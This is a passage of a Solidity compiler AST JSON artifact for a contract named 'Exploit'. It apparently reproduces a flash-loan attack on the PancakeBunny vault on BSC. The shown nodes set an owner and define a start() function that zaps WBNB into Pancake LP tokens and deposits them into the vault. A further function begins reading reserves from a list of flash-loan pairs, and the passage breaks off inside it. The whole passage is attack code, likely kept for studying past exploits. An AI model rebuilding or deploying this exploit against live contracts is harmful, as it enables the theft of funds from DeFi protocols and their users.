                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 84,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 4,
                      "src": "1689:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 85,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1697:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 86,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "1697:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "1689:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 88,
                  "nodeType": "ExpressionStatement",
                  "src": "1689:18:0"
                }
              ]
            },
            "id": 90,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 82,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1669:2:0"
            },
            "returnParameters": {
              "id": 83,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1679:0:0"
            },
            "scope": 587,
            "src": "1658:56:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 101,
              "nodeType": "Block",
              "src": "1740:83:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 96,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 93,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1758:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 94,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "1758:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 95,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 4,
                          "src": "1772:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "1758:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "43616c6c6572206973206e6f7420746865206f776e6572",
                        "id": 97,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1779:25:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_15ed5034391ed5ef65b8bb8dbcb08f9b6c4034ebcf89f76344a17e1651e92b33",
                          "typeString": "literal_string \"Caller is not the owner\""
                        },
                        "value": "Caller is not the owner"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_15ed5034391ed5ef65b8bb8dbcb08f9b6c4034ebcf89f76344a17e1651e92b33",
                          "typeString": "literal_string \"Caller is not the owner\""
                        }
                      ],
                      "id": 92,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1750:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 98,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1750:55:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 99,
                  "nodeType": "ExpressionStatement",
                  "src": "1750:55:0"
                },
                {
                  "id": 100,
                  "nodeType": "PlaceholderStatement",
                  "src": "1815:1:0"
                }
              ]
            },
            "id": 102,
            "name": "onlyOwner",
            "nameLocation": "1729:9:0",
            "nodeType": "ModifierDefinition",
            "parameters": {
              "id": 91,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1738:2:0"
            },
            "src": "1720:103:0",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 157,
              "nodeType": "Block",
              "src": "1894:339:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 112,
                            "name": "ZapBSC",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 30,
                            "src": "1925:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IZap_$1313",
                              "typeString": "contract IZap"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IZap_$1313",
                              "typeString": "contract IZap"
                            }
                          ],
                          "id": 111,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1917:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 110,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1917:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 113,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1917:15:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "31653138",
                        "id": 114,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1934:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        },
                        "value": "1e18"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        }
                      ],
                      "expression": {
                        "id": 107,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 12,
                        "src": "1904:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$629",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 109,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 616,
                      "src": "1904:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,uint256) external"
                      }
                    },
                    "id": 115,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1904:35:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 116,
                  "nodeType": "ExpressionStatement",
                  "src": "1904:35:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 122,
                            "name": "WBNB",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 12,
                            "src": "1975:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$629",
                              "typeString": "contract IERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IERC20_$629",
                              "typeString": "contract IERC20"
                            }
                          ],
                          "id": 121,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1967:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 120,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1967:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 123,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1967:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "31653138",
                        "id": 124,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1982:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        },
                        "value": "1e18"
                      },
                      {
                        "arguments": [
                          {
                            "id": 127,
                            "name": "Pair_PancakeLps",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "1996:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                              "typeString": "contract IPancakeERC20"
                            }
                          ],
                          "id": 126,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1988:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 125,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1988:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 128,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1988:24:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "expression": {
                        "id": 117,
                        "name": "ZapBSC",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 30,
                        "src": "1949:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IZap_$1313",
                          "typeString": "contract IZap"
                        }
                      },
                      "id": 119,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "zapInToken",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1312,
                      "src": "1949:17:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,uint256,address) external"
                      }
                    },
                    "id": 129,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1949:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 130,
                  "nodeType": "ExpressionStatement",
                  "src": "1949:64:0"
                },
                {
                  "assignments": [
                    132
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 132,
                      "mutability": "mutable",
                      "name": "received_LPs",
                      "nameLocation": "2029:12:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 157,
                      "src": "2024:17:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 131,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "2024:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 140,
                  "initialValue": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 137,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "2078:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Exploit_$587",
                              "typeString": "contract Exploit"
                            }
                          ],
                          "id": 136,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2070:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 135,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2070:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 138,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2070:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "expression": {
                        "id": 133,
                        "name": "Pair_PancakeLps",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 36,
                        "src": "2044:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                          "typeString": "contract IPancakeERC20"
                        }
                      },
                      "id": 134,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "balanceOf",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 912,
                      "src": "2044:25:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                        "typeString": "function (address) view external returns (uint256)"
                      }
                    },
                    "id": 139,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2044:40:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2024:60:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 146,
                            "name": "PancakeBunny_FLIP_USDT_BNB",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 42,
                            "src": "2126:26:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                              "typeString": "contract IVaultFlipToFlip"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                              "typeString": "contract IVaultFlipToFlip"
                            }
                          ],
                          "id": 145,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2118:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 144,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2118:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 147,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2118:35:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 148,
                        "name": "received_LPs",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 132,
                        "src": "2155:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 141,
                        "name": "Pair_PancakeLps",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 36,
                        "src": "2094:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                          "typeString": "contract IPancakeERC20"
                        }
                      },
                      "id": 143,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 930,
                      "src": "2094:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 149,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2094:74:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 150,
                  "nodeType": "ExpressionStatement",
                  "src": "2094:74:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 154,
                        "name": "received_LPs",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 132,
                        "src": "2213:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 151,
                        "name": "PancakeBunny_FLIP_USDT_BNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 42,
                        "src": "2178:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                          "typeString": "contract IVaultFlipToFlip"
                        }
                      },
                      "id": 153,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "deposit",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1318,
                      "src": "2178:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256) external"
                      }
                    },
                    "id": 155,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2178:48:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 156,
                  "nodeType": "ExpressionStatement",
                  "src": "2178:48:0"
                }
              ]
            },
            "functionSelector": "be9a6555",
            "id": 158,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 105,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 104,
                  "name": "onlyOwner",
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 102,
                  "src": "1884:9:0"
                },
                "nodeType": "ModifierInvocation",
                "src": "1884:9:0"
              }
            ],
            "name": "start",
            "nameLocation": "1869:5:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 103,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1874:2:0"
            },
            "returnParameters": {
              "id": 106,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1894:0:0"
            },
            "scope": 587,
            "src": "1860:373:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 230,
              "nodeType": "Block",
              "src": "2264:541:0",
              "statements": [
                {
                  "assignments": [
                    162,
                    164,
                    null
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 162,
                      "mutability": "mutable",
                      "name": "amount0",
                      "nameLocation": "2280:7:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 230,
                      "src": "2275:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 161,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "2275:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    {
                      "constant": false,
                      "id": 164,
                      "mutability": "mutable",
                      "name": "amount1",
                      "nameLocation": "2294:7:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 230,
                      "src": "2289:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 163,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "2289:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    },
                    null
                  ],
                  "id": 172,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "arguments": [
                          {
                            "baseExpression": {
                              "id": 166,
                              "name": "flashloanPairs",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 54,
                              "src": "2320:14:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_array$_t_address_$7_storage",
                                "typeString": "address[7] storage ref"
                              }
                            },
                            "id": 168,
                            "indexExpression": {
                              "hexValue": "30",
                              "id": 167,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2335:1:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              "value": "0"
                            },
                            "isConstant": false,
                            "isLValue": true,
                            "isPure": false,
                            "lValueRequested": false,
                            "nodeType": "IndexAccess",
                            "src": "2320:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 165,
                          "name": "IPancakePair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 869,
                          "src": "2307:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                            "typeString": "type(contract IPancakePair)"
                          }
                        },
                        "id": 169,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2307:31:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakePair_$869",
                          "typeString": "contract IPancakePair"
                        }
                      },
                      "id": 170,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getReserves",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 811,
                      "src": "2307:43:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                        "typeString": "function () view external returns (uint112,uint112,uint32)"
                      }
                    },
                    "id": 171,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2307:45:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                      "typeString": "tuple(uint112,uint112,uint32)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2274:78:0"
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 184,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "arguments": [
                        {
                          "id": 175,
                          "name": "WBNB",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 12,
                          "src": "2374:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$629",
                            "typeString": "contract IERC20"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_IERC20_$629",
                            "typeString": "contract IERC20"
                          }
                        ],
                        "id": 174,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "2366:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 173,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "2366:7:0",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 176,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "2366:13:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "arguments": [
                            {
                              "baseExpression": {
                                "id": 178,
                                "name": "flashloanPairs",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 54,
                                "src": "2396:14:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_array$_t_address_$7_storage",
                                  "typeString": "address[7] storage ref"
                                }
                              },
                              "id": 180,
                              "indexExpression": {
                                "hexValue": "30",
                                "id": 179,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "2411:1:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_0_by_1",
                                  "typeString": "int_const 0"
                                },
                                "value": "0"
                              },
                              "isConstant": false,
                              "isLValue": true,
                              "isPure": false,
                              "lValueRequested": false,
                              "nodeType": "IndexAccess",
                              "src": "2396:17:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 177,
                            "name": "IPancakePair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 869,
                            "src": "2383:12:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                              "typeString": "type(contract IPancakePair)"
                            }
                          },
                          "id": 181,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2383:31:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakePair_$869",
                            "typeString": "contract IPancakePair"
                          }
                        },
                        "id": 182,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "token1",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 802,
                        "src": "2383:38:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                          "typeString": "function () view external returns (address)"
                        }
                      },
                      "id": 183,
